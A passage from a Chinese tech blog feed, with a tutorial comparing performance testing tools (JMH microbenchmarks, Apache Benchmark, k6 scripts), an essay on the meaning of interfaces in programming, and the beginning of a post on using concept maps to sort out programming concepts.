中产出的行动需要有专人负责，即使有些行动是针对团队所有人，但需要有专人负责提醒、检查。</li></ol>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>几种性能测试工具总结</title>
      <link href="/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/performance-test/"/>
      <url>/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/performance-test/</url>
      
        <content type="html"><![CDATA[<p>我们经常会谈论性能、并发等问题，但是衡量性能不是说写段代码循环几百次这么简单。最近从项目上的同事了解到了代码化的测试性能测试工具 k6，以及结合之前用过的Java 微基准测试 (JMH)、AB (Apache Benchmark) 测试、Jmeter 做一下总结。</p><p>谈性能，实际上结合实际的业务背景、网络条件、测试数据的选择等因素影响非常大，单纯的谈 QPS 等数据意义不大。</p><p>这里介绍的几个工具刚好能满足平时开发工作中不同场景下衡量性能的需求，因此整理出来。</p><ul><li>Java 微基准测试 (JMH) 可以用于衡量一段 Java 代码到底性能如何，例如我们平时总是谈 StringBuilder 比 new String() 快很多。我们有一个很好地量化方法，就可以很直观的展示出一段代码的性能优劣。</li><li>AB (Apache Benchmark) 测试是 Apache 服务器内置的一个 http web 压测工具，非常简单易用。Mac 预装了 Apache，因此可以随手使用来测试一个页面或者 API 的性能。贵在简单易用，无需额外安装。</li><li>k6 一款使用 go 语言编写，支持用户编写测试脚本的测试套件。弥补了 ab 测试功能不足，以及 jemeter 不容易代码化的缺点。也是项目上需要使用，从同事那里了解到的。</li><li>Jmeter 老牌的性能测试工具，有大量专门讲 jmeter 的资料，本文不再赘述。</li></ul><p>那我们从 JMH 开始从来看下这几个工具的特点和使用吧。</p><h2 id="Java-微基准测试"><a href="#Java-微基准测试" class="headerlink" title="Java 微基准测试"></a>Java 微基准测试</h2><blockquote><p>StringBuilder 到底比 new String() 快多少呢？</p></blockquote><p>我们可以使用 JMH 来测试一下。JMH 是一个用于构建、运行和分析 Java 方法运行性能工具，可以做到 nano/micro/mili/macro 时间粒度。JMH 不仅可以分析 Java 语言，基于 JVM 的语言都可以使用。</p><p>JMH 由 OpenJDK 团队开发，由一次下载 OpenJDK 时注意到官网还有这么一个东西。</p><p>OpenJdk 官方运行 JMH 测试推的方法是使用 Maven 构建一个单独的项目，然后把需要测试的项目作为 Jar 包引入。这样能排除项目代码的干扰，得到比较可靠地测试效果。当然也可以使用 IDE 或者 Gradle 配置到自己项目中，便于和已有项目集成，代价是配置比较麻烦并且结果没那么可靠。</p><h3 id="使用-Maven-构建基准测试"><a href="#使用-Maven-构建基准测试" class="headerlink" title="使用 Maven 构建基准测试"></a>使用 Maven 构建基准测试</h3><p>根据官网的例子，我们可以使用官网的一个模板项目。</p><blockquote><p>mvn archetype:generate \<br>     -DinteractiveMode=false \<br>     -DarchetypeGroupId=org.openjdk.jmh \<br>     -DarchetypeArtifactId=jmh-java-benchmark-archetype \<br>     -DgroupId=org.sample \<br>     -DartifactId=test \<br>     -Dversion=1.0</p></blockquote><p>创建一个项目，导入 IDE，Maven 会帮我们生成一个测试类，但是这个测试类没有任何内容，这个测试也是可以运行的。</p><p>先编译成 jar</p><blockquote><p>mvn clean install</p></blockquote><p>然后使用 javar -jar 来运行测试</p><blockquote><p>java -jar target/benchmarks.jar</p></blockquote><p>运行后可以看到输出信息中包含 JDK、JVM 等信息，以及一些用于测试的配置信息。</p><pre><code># JMH version: 1.22# VM version: JDK 1.8.0_181, Java HotSpot(TM) 64-Bit Server VM, 25.181-b13# VM invoker: /Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/jre/bin/java# VM options: &lt;none&gt;# Warmup: 5 iterations, 10 s each# Measurement: 5 iterations, 10 s each# Timeout: 10 min per iteration# Threads: 1 thread, will synchronize iterations# Benchmark mode: Throughput, ops/time# Benchmark: org.sample.MyBenchmark.testSimpleString</code></pre><p>下面是一些配置信息说明</p><ul><li>Warmup 因为 JVM 即时编译的存在，所以为了更加准确有一个预热环节，这里是预热  5，每轮 10s。</li><li>Measurement 是真实的性能测量参数，这里是 5轮，每轮10s。</li><li>Timeout 每轮测试，JMH 会进行 GC 然后暂停一段时间，默认是 10 分钟。</li><li>Threads 使用多少个线程来运行，一个线程会同步阻塞执行。</li><li>Benchmark mode 输出的运行模式，常用的有下面几个。<ul><li>Throughput 吞吐量，即每单位运行多少次操作。</li><li>AverageTime 调用的平均时间，每次调用耗费多少时间。</li><li>SingleShotTime 运行一次的时间，如果把预热关闭可以测试代码冷启动时间</li></ul></li><li>Benchmark 测试的目标类</li></ul><p>实际上还有很多配置，可以通过 -h 参数查看</p><blockquote><p>java -jar target/benchmarks.jar -h</p></blockquote><p>由于默认的配置停顿的时间太长，我们通过注解修改配置，并增加了 Java 中最基本的字符串操作性能对比。</p><pre><code>@BenchmarkMode(Mode.Throughput)@Warmup(iterations = 3)@Measurement(iterations = 5, time = 5, timeUnit = TimeUnit.SECONDS)@Threads(8)@Fork(1)@OutputTimeUnit(TimeUnit.MILLISECONDS)public class MyBenchmark {    @Benchmark    public void testSimpleString() {        String s = &quot;Hello world!&quot;;        for (int i = 0; i &lt; 10; i++) {            s += s;        }    }    @Benchmark    public void testStringBuilder() {        StringBuilder sb = new StringBuilder();        for (int i = 0; i &lt; 10; i++) {            sb.append(i);        }    }}</code></pre><p>在控制台可以看到输出的测试报告，我们直接看最后一部分即可。</p><pre><code>Benchmark                       Mode  Cnt      Score      Error   UnitsMyBenchmark.testSimpleString   thrpt   10    226.930 ±   16.621  ops/msMyBenchmark.testStringBuilder  thrpt   10  80369.037 ± 3058.280  ops/ms</code></pre><p>Score 这列的意思是每毫秒完成了多少次操作，可见 StringBuilder 确实比普通的 String 构造器性能高很多。</p><h3 id="更多有趣的测试"><a href="#更多有趣的测试" class="headerlink" title="更多有趣的测试"></a>更多有趣的测试</h3><p>实际上平时 Java 开发中一些细节对性能有明显的影响，虽然对系统整体来说影响比较小，但是注意这些细节可以低成本的避免性能问题堆积。</p><p>其中一个非常有意思细节是自动包装类型的使用，即使是一个简单的 for 循环，如果不小心讲 int 使用成 Integer 也会造成性能浪费。</p><p>我们来编写一个简单的基准测试</p><pre><code>    @Benchmark    public void primaryDataType() {        int sum = 0;        for (int i = 0; i &lt; 10; i++) {            sum += i;        }    }    @Benchmark    public void boxDataType() {        int sum = 0;        for (Integer i = 0; i &lt; 10; i++) {            sum += i;        }    }</code></pre><p>运行测试后，得到下面的测试结果</p><pre><code>AutoBoxBenchmark.boxDataType       thrpt    5   312779.633 ±   26761.457  ops/msAutoBoxBenchmark.primaryDataType   thrpt    5  8522641.543 ± 2500518.440  ops/ms</code></pre><p>基本类型的性能高出了一个数量级。当然你可能会说基本类型这种性能问题比较微小，但是性能往往就是这种从细微处提高的。另外编写 JMH 测试也会让团队看待性能问题更为直观。</p><h3 id="一份直观的-Java-基础性能报告"><a href="#一份直观的-Java-基础性能报告" class="headerlink" title="一份直观的 Java 基础性能报告"></a>一份直观的 Java 基础性能报告</h3><p>下面是我写的常见场景的性能测试，例如 StringBuilder 比 new String() 速度快几个数量级。</p><table><thead><tr><th>Test</th><th>Mode</th><th>OPS</th><th>Unit</th></tr></thead><tbody><tr><td>“cn.printf.jmhreports.AutoBoxBenchmark.boxDataType”</td><td>“thrpt”</td><td>323693300.862712</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.AutoBoxBenchmark.primaryDataType”</td><td>“thrpt”</td><td>9421830157.195677</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.CacheValueBenchmark.test”</td><td>“thrpt”</td><td>204814.611974</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.CacheValueBenchmark.testStringBuilder”</td><td>“thrpt”</td><td>80039810.903665</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.StringBenchmark.constructStringByAssignment”</td><td>“thrpt”</td><td>197815.644537</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.StringBenchmark.constructStringByConstructor”</td><td>“thrpt”</td><td>205494.677150</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.StringBenchmark.constructStringByStringBuilder”</td><td>“thrpt”</td><td>66162972.690813</td><td>ops/s</td></tr></tbody></table><p>代码仓库和持续更新的基准测试可以看下面的仓库。</p><p><a href="https://github.com/linksgo2011/jmh-reports" target="_blank" rel="noopener">https://github.com/linksgo2011/jmh-reports</a></p><h2 id="Apache-Benchmark-测试"><a href="#Apache-Benchmark-测试" class="headerlink" title="Apache Benchmark 测试"></a>Apache Benchmark 测试</h2><blockquote><p>我想用命令行快速简单的压测一下网站该怎么办呢？</p></blockquote><p>Apache Benchmark (简称 ab，不同于产品领域的 A/B 测试) 是 Apache web 服务器自带的性能测试工具，在 windows 或者 linux 上安装了 Apache 服务器就可以在其安装位置的 bin 目录中找到 ab 这个程序。</p><p>ab 使用起来非常简单，一般只需要 -n 参数指明发出请求的总数，以及 -c 参数指明测试期间的并发数。</p><p>例如对 ThoughtWorks 官网首页发出 100 个请求，模拟并发数为 10：</p><blockquote><p>ab -n 100 -c 10 <a href="https://thoughtworks.com/" target="_blank" rel="noopener">https://thoughtworks.com/</a></p></blockquote><p>需要注意的是 ab 工具接收一个 url 作为参数，仅仅是一个域名是不合法的，需要增加 <code>/</code> 表示首页。稍等片刻后就可以看到测试报告:</p><pre><code>Server Software:        nginx/1.15.6Server Hostname:        thoughtworks.comServer Port:            443SSL/TLS Protocol:       TLSv1.2,ECDHE-RSA-AES256-GCM-SHA384,2048,256Server Temp Key:        ECDH P-256 256 bitsTLS Server Name:        thoughtworks.comDocument Path:          /Document Length:        162 bytesConcurrency Level:      10Time taken for tests:   42.079 secondsComplete requests:      100Failed requests:        0Non-2xx responses:      100Total transferred:      42500 bytesHTML transferred:       16200 bytesRequests per second:    2.38 [#/sec] (mean)Time per request:       4207.888 [ms] (mean)Time per request:       420.789 [ms] (mean, across all concurrent requests)Transfer rate:          0.99 [Kbytes/sec] receivedConnection Times (ms)              min  mean[+/-sd] median   maxConnect:     1056 2474 3006.1   1144   23032Processing:   349  740 1003.5    379    8461Waiting:      349  461 290.9    377    2265Total:       1411 3214 3273.9   1674   23424Percentage of the requests served within a certain time (ms)  50%   1674  66%   2954  75%   3951  80%   4397  90%   6713  95%   9400  98%  14973  99%  23424 100%  23424 (longest request)</code></pre><p>从这个报告中可以看到服务器的一些基本信息，以及请求的统计信息。比较重要的指标是 <code>Requests per second</code> 每秒钟完成的请求数量，不严格的说也就是我们的平时说的 QPS。</p><p>ab 测试是专为 http 请求设计的，因此 ab 的其他参数和 curl 的参数比较类似，也可以指定 http method 以及 cookies 等参数。</p><h2 id="K6-测试套件"><a href="#K6-测试套件" class="headerlink" title="K6 测试套件"></a>K6 测试套件</h2><blockquote><p>我需要编写复杂的测试脚本，并保留压测的脚本、参数、数据，以及版本化该怎么做呢？</p></blockquote><p>k6 是一个压力测试套件，使用 golang 编写。主要特性有：</p><ul><li>提供了友好的 CLI  工具</li><li>使用 JavaScript 代码编写测试用例</li><li>可以根据性能条件设置阈值，表明成功还是失败</li></ul><p>k6 没有使用 nodejs 而是 golang 程序，通过包裹了一个 JavaScript 运行时来运行 JavaScript 脚本，因此不能直接使用 npm 包以及 Nodejs 提供的一些 API。</p><p>同时，k6 在运行测试时，没有启动浏览器，主要用于测试页面以及 API 加载速度。k6 提供了通过网络请求（HAR）生成测试脚本的方法，实现更简便的测试脚本编写，以及 session 的维护。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>在 Mac 上比较简单，直接使用 HomeBrew 即可安装：</p><blockquote><p>brew install k6</p></blockquote><p>其他平台官网也提供了相应的安装方式，比较特别的是提供了 Docker 的方式运行。</p><p>直接使用 k6 的命令运行测试，官网提供了一个例子：</p><blockquote><p>k6 run github.com/loadimpact/k6/samples/http_get.js</p></blockquote><p>也可以编写自己的测试脚本:</p><pre><code>import http from &quot;k6/http&quot;;import { sleep } from &quot;k6&quot;;export default function() {  http.get(&quot;https://www.thoughtworks.com/&quot;);  sleep(1);};</code></pre><p>保存文件 script.js 后运行 k6 命令</p><blockquote><p>k6 run script.js</p></blockquote><p>然后可以看到 http 请求的各项指标</p><pre><code>        /\      |‾‾|  /‾‾/  /‾/        /\  /  \     |  |_/  /  / /        /  \/    \    |      |  /  ‾‾\     /          \   |  |‾\  \ | (_) |   / __________ \  |__|  \__\ \___/ .io  execution: local     output: -     script: k6.js    duration: -,  iterations: 1         vus: 1, max: 1    done [==========================================================] 1 / 1    data_received..............: 108 kB 27 kB/s    data_sent..................: 1.0 kB 252 B/s    http_req_blocked...........: avg=2.35s    min=2.35s    med=2.35s    max=2.35s    p(90)=2.35s    p(95)=2.35s       http_req_connecting........: avg=79.18ms  min=79.18ms  med=79.18ms  max=79.18ms  p(90)=79.18ms  p(95)=79.18ms     http_req_duration..........: avg=639.03ms min=639.03ms med=639.03ms max=639.03ms p(90)=639.03ms p(95)=639.03ms    http_req_receiving.........: avg=358.12ms min=358.12ms med=358.12ms max=358.12ms p(90)=358.12ms p(95)=358.12ms    http_req_sending...........: avg=1.79ms   min=1.79ms   med=1.79ms   max=1.79ms   p(90)=1.79ms   p(95)=1.79ms      http_req_tls_handshaking...: avg=701.46ms min=701.46ms med=701.46ms max=701.46ms p(90)=701.46ms p(95)=701.46ms    http_req_waiting...........: avg=279.12ms min=279.12ms med=279.12ms max=279.12ms p(90)=279.12ms p(95)=279.12ms    http_reqs..................: 1      0.249921/s    iteration_duration.........: avg=4s       min=4s       med=4s       max=4s       p(90)=4s       p(95)=4s          iterations.................: 1      0.249921/s    vus........................: 1      min=1 max=1    vus_max....................: 1      min=1 max=1</code></pre><p>k6 提供的性能指标相对 ab 工具多很多，也可以通过脚本自己计算性能指标。和 ab 工具中表明每秒钟处理完的请求数是 http_reqs，上面的测试默认只有一个用户的一次请求，如果通过参数增加更多请求，可以看到和 ab 工具得到的结果比较接近。</p><p>运行压力测试时，需要增加更多的虚拟用户（VU），vus 参数和持续时间的参数:</p><blockquote><p>k6 run –vus 10 –duration 30s script.js</p></blockquote><h3 id="编写测试脚本的一些规则"><a href="#编写测试脚本的一些规则" class="headerlink" title="编写测试脚本的一些规则"></a>编写测试脚本的一些规则</h3><p><code>default</code> 方法是用于给每个 VU 以及每次迭代重复运行的，因此需要把真正的测试代码放到这个方法中，例如访问某个页面。</p><p>为了保证测试的准确性，一些初始化的代码不应该放到 <code>default</code> 方法中。尤其是文件的读取等依赖环境上下文的操作不能放到 <code>default</code> 方法中执行，这样做也会丢失 k6 分布式运行的能力。</p><p>前面提到的命令行参数，例如指定虚拟用户数量 <code>--vus 10</code>，这些参数也可以放到脚本代码中。通过暴露一个 options 对象即可。</p><pre><code>export let options = {  vus: 10,  duration: &quot;30s&quot;};</code></pre><p>为了更为真实的模拟用户访问的场景，k6 提供了在整个测试期间让用户数量和访问时间呈阶段性变化的能力。只需要在 options 中增加 stages 参数即可：</p><pre><code>export let options = { stages: [    { duration: &quot;30s&quot;, target: 20 },    { duration: &quot;1m30s&quot;, target: 10  },    { duration: &quot;20s&quot;, target: 0 },  ]};</code></pre><p>在测试过程中需要检查网络请求是否成功，返回的状态码是否正确，以及响应时间是否符合某个阈值。在脚本中可以通过调用 check() 方法编写检查语句，以便 k6 能收集到报告。</p><pre><code>import http from &quot;k6/http&quot;;import { check, sleep } from &quot;k6&quot;;export let options = {  vus: 10,  duration: &quot;30s&quot;};export default function() {  let res = http.get(&quot;https://www.thoughtworks.com/&quot;);  check(res, {    &quot;status was 200&quot;: (r) =&gt; r.status == 200,    &quot;transaction time OK&quot;: (r) =&gt; r.timings.duration &lt; 200  });  sleep(1);};</code></pre><h3 id="报告输出"><a href="#报告输出" class="headerlink" title="报告输出"></a>报告输出</h3><p>k6 默认将报告输出到 stdout 控制台，同时也提供了多种格式报告输出，包括：</p><ul><li>JSON</li><li>CSV</li><li>InfluxDB</li><li>Apache Kafka</li><li>StatsD</li><li>Datadog</li><li>Load Impact cloud platform</li></ul><p>当然，我们在编写测试的时候不可能只有一个用例，对多个场景可以在脚本中通过 <code>group</code> 进行分组，分组后输出的报告会按照分组排列。同时，也可以使用对一个组整体性能衡量的指标 <code>group_duration</code>。</p><pre><code>import { group } from &quot;k6&quot;;export default function() {  group(&quot;user flow: returning user&quot;, function() {    group(&quot;visit homepage&quot;, function() {      // load homepage resources    });    group(&quot;login&quot;, function() {      // perform login    });  });};</code></pre><p>InfluxDB 等外部数据收集平台时，还可以打上标签，供过滤和检索使用。k6 提供了一些内置的标签，并允许用户自定义标签。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实际上用于性能测试的工具还有很多，也有一些专门的工具针对网络质量（iperf） 、数据库（sysbench）、前端页面（PageSpeed）等专门方面进行性能测试。</p><p>写本文的初衷是想说评价性能，以及做性能优化的第一步应该是寻找到合适工具做一次基准测试，这样的优化往往才有意义。我在使用 JMH 后不仅在工作中使用它对一些代码片段进行测试以及优化，同时更重要的是，在codereview 中对某些操作关于性能的讨论不再基于经验，而是事实。</p>]]></content>
      
      
      <categories>
          
          <category> 性能优化 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>程序语言中接口的深层次含义</title>
      <link href="/thinking/thinking/how-to-understand-interface/"/>
      <url>/thinking/thinking/how-to-understand-interface/</url>
      
        <content type="html"><![CDATA[<p>计算机科学本应该是一个实践和具体的科学，但是随着面向对象等思想的发展，大量的概念、原则、思想含糊不清，“编程思想” 则更加玄之又玄。</p><p>接口是面向对象中最重要的一个概念之一，接口这个词被用的太过于广泛，以至于成为软件工程师们最容易争吵的地方。</p><p>我们说的接口在不同上下文中略微不同，我猜测这是容易引发争论的原因，尝试分解为几个不同的场景，同时给出一些例子说明接口的不同含义。</p><h2 id="强类型语言中的-interface"><a href="#强类型语言中的-interface" class="headerlink" title="强类型语言中的 interface"></a>强类型语言中的 interface</h2><p>以 Java 为例，在强类型的语言中，天然就拥有 interface 的特性。当我们对一个功能要求多个实现的时候，我们可以先通过接口定义出需要的方法，然后使用不同的对象实现。</p><p>举个例子，现实生活中，我们想要通过一台计算机把文档或者图片投影到幕布上，同时也需要能通过打印机打印出来，那么投影仪和打印机两台输出设备必须具备支持信息输出的接口。</p><p><img src="/thinking/thinking/how-to-understand-interface/3897248284.jpg" alt="interface-1.jpg"></p><p>如果使用 Java 来实现这个业务场景，可以通过定义一个 output 方法的 interface。打印机类（ Printer ）和 投影仪类（Projector）实现这个 interface，并实现该 interface 中的 output 方法。</p><p><img src="/thinking/thinking/how-to-understand-interface/1455301577.jpg" alt="interface-2.jpg"><br>通过这个例子，我们可以认识到某个类为了实现某个功能必须提供一些方法，从而和系统中其他部分交互，在 Java 中通过 interface 来定义。在一些资料中，interface 被当做了一种特殊的抽象类，被认为抽象类，实际上不是特别准确。我们来拓展一下上面的例子，说明一下接口和抽象类的细微差别。</p><p>假设我们原来的打印机只能打印黑白色，现在想要实现彩色打印，我们可以增加一台彩色打印机（ColorPrinter），并把原来的打印机命名为黑白打印机（WBPrinter）。</p><p><img src="/thinking/thinking/how-to-understand-interface/2672922179.jpg" alt="interface-3.jpg"></p><p>然后我们发现彩色打印机和黑白打印机都有一些共同的东西，例如纸张、油墨等。于是我们使用了抽象类（或者一个普通父类）来归纳这些属性，就像继承财产一样。这个抽象类同时也可以实现接口，并继承给子类。</p><p><img src="/thinking/thinking/how-to-understand-interface/1004911624.jpg" alt="interface4.jpg"></p><p>通过这个例子，在 Java 中 interface 只是定义了实现这个接口的类是否能按照具体输入（参数）实现某些功能（方法）的能力，实现接口的过程中并没有传递任何状态和属性，这一点和抽象类有本质的区别。</p><p>因此可以说在 Java 世界里的接口是一组方法定义的集合。</p><h2 id="JavaScript-中的接口"><a href="#JavaScript-中的接口" class="headerlink" title="JavaScript 中的接口"></a>JavaScript 中的接口</h2><p>到了我们 JavaScript 中，不再有语言层面上的 interface，还能不能实现类似的功能呢？</p><p>答案是肯定的，我们在日常开发中也印证了这一点，JavaScript 是一门图灵完备的语言，java 能完成的任务，只要提供同样的运行环境 理论上 JavaScript 一样可以完成。只不过在实现 Projecto 和 Printer 类时，没有 interface 可以使用，开发者只能在大脑里存在一个意识： “我需要让这两个类提供命名一样、参数一样的 output 方法”。否则在运行时程序会因为找不到 output 方法而报错。</p><p>实际上，在开发 JavaScript 应用程序时，我们的 “interface” 存在于开发者的大脑和团队的约定中，下图的 interface 我使用虚线标出。</p><p><img src="/thinking/thinking/how-to-understand-interface/778236198.jpg" alt="interface-5.jpg"></p><p>在JavaScript的世界里，缺乏语法层面上的 interface，因此只能通过口头约定来实现接口。因为缺乏语言支持，这个约定是不清晰的，可以由第三方工具或者文档来支持。</p><p>随着越来越多的开发者意识到 “interface” 其实一直都存在，但 JavaScript 没有编译这个过程，无法对 “interface” 强制约束。于是 Flow 和 TypeScript 被开发出来帮我们完成这件事，在开发时期提供了 interface 这样一种特性。</p><p>如果我们尝试对比 TypeScript 代码和编译出来的 JavaScript 代码，我们会发现 TypeScript 中的interface 会彻底消失，就像根本不存在一样。</p><p><img src="/thinking/thinking/how-to-understand-interface/2006504323.jpg" alt="interface-6.jpg"></p><p>通过编译TypeScript可以进一步证明，接口只是一个约定，编译完成后就不再需要了。实际上，对比 Java 源代码和 class字节码也能得到同样的结论。</p><h2 id="跨语言的接口"><a href="#跨语言的接口" class="headerlink" title="跨语言的接口"></a>跨语言的接口</h2><p>当我们理解到弱类型语言中实际上也有接口存在，但是处于一个非常隐晦的概念中，我们可以把这种视角拓展的更远。下面我们再来看计算机世界中更多的例子。</p><p>其中一个有趣的例子是数据库（特指关系型数据库）。在现实开发中，各种编程语言都可以和不同的数据库通信，这再正常不过，通过 Node.js 平台 JavaScript 都可以连接 MySQL了。</p><p>回想一下我们编程语言都是怎么和数据库交互的呢？</p><p><img src="/thinking/thinking/how-to-understand-interface/2229247324.jpg" alt="interface-7.jpg"></p><p>计算机中的差异化问题都可以通过增加分层的方式解决。所以对于不同的数据库和编程语言之间，我们有一个SQL语言。SQL 在这个场景下，充当了一个接口的角色。SQL 抽象了 DBMS 应该具备的能力，数据库相关的操作就可以都使用 SQL 来完成了。</p><p><img src="/thinking/thinking/how-to-understand-interface/487503327.jpg" alt="interface-8.jpg"></p><p>同样的例子还有很多，当我们在编写 JavaScript 脚本操作浏览器中的 DOM 时，在一定程度上不必考虑浏览器是 Chrome 还是 Firefox。DOM 充当了浏览器和JavaScript引擎的接口。甚至当 DOM 不是有浏览器来构建时，应用程序也有能力解析 HTML 并操作其中的属性。</p><p>所以在跨语言的交互中，往往存在一个容易被我们遗忘的中间层，充当着接口这一个角色。这个时候的接口是一种抽象。</p><h2 id="无处不在的接口"><a href="#无处不在的接口" class="headerlink" title="无处不在的接口"></a>无处不在的接口</h2><p>我们还能找出更多的接口的例子吗？</p><p>当我刚刚开始学习 Java 编程时，servlet-api 依赖的引入让我非常困惑。servlet-api 是一个只包含接口的 Java 包，为什么需要引入它到项目中，而且必不可少。随着对 Java 生态的逐步了解，才知道 servlet 本身就是一个 web 容器的规范，使得我们的编写的 Java 代码能被 Tomcat、Jboss 等 web 服务器正确的运行。servlet-api 这个包也仅仅是用来在开发和编译期间去检查我们的代码是否符合 servlet 的规范。</p><p>Artur Ventura 使用 JavaScript 编写了一个 Java 虚拟机 BicaVM，理论上讲 JavaScript 也可以编译成 Java 的字节码，JavaScript 的源代码遵守 servlet-api 的规范的情况下也可以编写出能运行在 Tomcat 中的服务端应用程序。</p><p>如果我们把接口的含义拓展的更广一点的话，<strong>接口就是协议或者规范。</strong></p><p>当我接触到越来越多的行业规范、软件标准、网络协议的时候，发现他们和我们在编程中谈到的接口并无二致。IP 协议让各种终端设备能接入互联网，TCP 让路由器和交换机传输数据，OSPF 能让所有的路由器共享路由表实现数据转发，而这些协议又被一种约定规范到TCP/IP 协议族中。</p><h2 id="只有接口的开源项目"><a href="#只有接口的开源项目" class="headerlink" title="只有接口的开源项目"></a>只有接口的开源项目</h2><p>开源世界也正在发生变化，厂商在发布一个开源项目时，已经不在局限于开源某个软件，而是先开源一套接口或者规范。</p><p>至于是开源社区的实现，或者是其他公司的商业实现都能接入到这个生态中来。过去的开源软件往往先贡献了多种实现，然后再从中抽象出约定和规范，实现生态的完善。人们已经意识到，是不是应该先利用开源的优势，接口先行。接口一旦被定义，自然会有多个平台、不同的语言提供相应的实现，甚至非开源的商业实现也可以无缝接入。</p><p>著名的例子越来越多，GraphQL 是一个结构化的API查询语言，社区中已经有很多的实现可以做到无痛替换；Swagger 不满足于作为API文档工具，而演化出OpenAPI; 实现了 EditorConfig 插件的编辑器和IDE可以通过.editorConfig文件统一代码风格。</p><p>那么未来的接口和实现的关系会是什么样子呢？</p>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用概念图梳理编程中的概念</title>
      <link href="/thinking/thinking/concept-map/"/>
      <url>/thinking/thinking/concept-map/</url>
      
        <content type="html"><![CDATA[<p>我是半个计算机专业的，我会把有故障的硬盘拆下来，也能把一块新的硬盘装回去，还能使用U盘或者光盘给它安装一套操作系统。</p><p>这能算我会修电脑吗？不，我不会，至少过年回家时对要求我义务修电脑的亲戚们说不会。但为难的是他们总能说出这句我无法反驳的话，“你一个学计算机的修个电脑都不会。“ 我内心嘀咕着 ”学化学的也不会造 TNT”，但实在无法找到一个合理的理由拒绝。</p><p>随着对逻辑学的进一步了解，“大妈式”的暴力辩论逻辑实际上是一种典型的偷换概念，计算机维修和学计算机完全是不同的概念。我们用下面的图来表达修电脑和学计算机之间的关系：</p><p><img src="/thinking/thinking/concept-map/610535295.png" alt="concept.png"></p><p>所以可以给出下面理由 —— 为什么计算机相关专业的学生不会修电脑。</p><ul><li>一本正经版： “因为我只是学计算机相关专业的一种，主要是做软件工程的，你这个屏幕不亮了属于硬件，因此这活儿做不了”</li><li>简单直接版：“我没有工具，人家专门修电脑的人有 xxxx（一堆听不懂的东西）”</li><li>胡扯版：“我是学微型计算机大规模分布式运算服务的（服务器编程）”</li></ul><p>所以通过梳理概念之间的关系，可以清晰得到一个概念，可以通过使用概念图来描述概念的层次关系，上面使用的图即是概念图。</p><p>美国著名教育学家诺瓦克遇到了同样的问题，他需要一种清晰地方式给学生解释一些课程中需要用到的概念。同时，也需要了解学生在理解概念上的变化。他们的研究小组从拓扑分类学和语义学方面得到灵感，创造出“概念图”这一思维工具来表达概念的练习。</p><p>例如一个常见的错误逻辑关系是 “中国属于联合国”，联合国是一个组织，而中国是一个国家，应改为“中国属于联合国成员国”。那么用概念图描述就是：</p><p><img src="/thinking/thinking/concept-map/2155065463.png" alt="uni-countries.png"></p><p>在学习编程过程中伴随着大量的概念，例如编程语言、Java、JVM 等抽象层次不一致的概念关系该如何梳理；在前端开发中 npm、浏览器看似没有关系两个概念是怎么在平时开发过程中联系到一起的；或者扯远一点，怎么解释《公孙龙子》“三脚鸡”的逻辑问题 —— 鸡有脚，并且数的时候每只鸡有两只脚，那合起来是不是鸡有三只脚。</p><p>对于这些问题，可以使用概念图帮我们梳理概念的层次关系，下面让我们进一步了解概念图是如何帮我们更好地梳理大量概念的。</p><h2 id="编程语言相关概念点"><a href="#编程语言相关概念点" class="headerlink" title="编程语言相关概念点"></a>编程语言相关概念点</h2><p>有一天我回到办公室，有两个同事在讨论编程语言相关的内容。</p><p>同事 A：“我是做 Python 的，我现在想转 Java”。<br>同事 B：“编程思想都是一样的，什么语言都一样”<br>同事 A：迷惑中</p><p>A 想从 Python 转到 Java ，可能是市场对 Java 的接受程度更高，但有时候会有人说“编程语言都一样”。看起来 B 说的很有道理，但他们说的是同一回事吗？</p><p>实际上 A 是想表达对编程职业生涯的担忧，“Java” 在他的意识里是指的相关整套技术体系，B 想说的只是用来完成编码的计算机语言。我们用概念图看下“编程”这个概念，再来看他们讨论的是不是同一个东西：</p><p><img src="http://www.printf.cn/usr/uploads/2019/09/1380509127.png" alt="programming.png"></p><p>我们真的只是缺乏编程思想吗？</p><p>我们要完成编程这个活动，需要了解编程语言、框架、库以及阅读相关的文档、书籍和开源代码。切换技术栈的成本是巨大的，不只是具有编程思想这么简单。</p><p>往往我们在谈论 Java 时，谈的不仅仅是一个编程语言的 Java，我们还在谈 JDK、JVM、Spring 等内容；甚至我们在谈论 Spring 的时候我们在谈论 Spring IOC、Spring MVC 以及 Spring boot。</p><p>谈论数据库的时候也会谈论 DBMS、SQL、JDBC、driver、ORM 等概念，甚至包含了数据库连接的客户端工具例如 Navicat，有时候也会谈数据库的具体实现：MySQL、Oracle 或者其他 NoSQL 数据库。</p><p>甚至谈论数据库这个概念本身往往都包含了多个含义：数据库管理系统（DBMS）、一个数据库实例（DB）。</p><h2 id="Java-服务器编程相关概念点"><a href="#Java-服务器编程相关概念点" class="headerlink" title="Java 服务器编程相关概念点"></a>Java 服务器编程相关概念点</h2><p>我在刚刚学习 Java 技术栈做 WEB 服务器开发时对很多概念非常困惑，Java 的生态非常完善，带来的概念也非常多 —— JPA、Servlet容器、Tomcat 等，它们的关系对于初学者来说相当的微妙。在使用 PHP 开发网站时，往往只需要查阅 PHP 的文档和一个框架的文档，而Java 生态圈充斥着大量陌生概念。</p><p>我整理了一份侧重于 Java、Servlet、Spring 家族一系列概念的概念图，这里主要关注几个比较难以分清的概念，真实的 Java 服务器开发领域所涉及的概念还非常多。</p><p><img src="http://www.printf.cn/usr/uploads/2019/09/2604546174.jpg" alt="java-backend.jpg"></p><p>作为语言的 Java 衍生出来的概念是相关的运行环境、库和框架。Java 字节码运行在由 JRE 运行环境提供的 JVM 虚拟机之上的，Tomcat 是一个 Java 应用程序，并提供了 Servlet 容器负责处理 HTTP 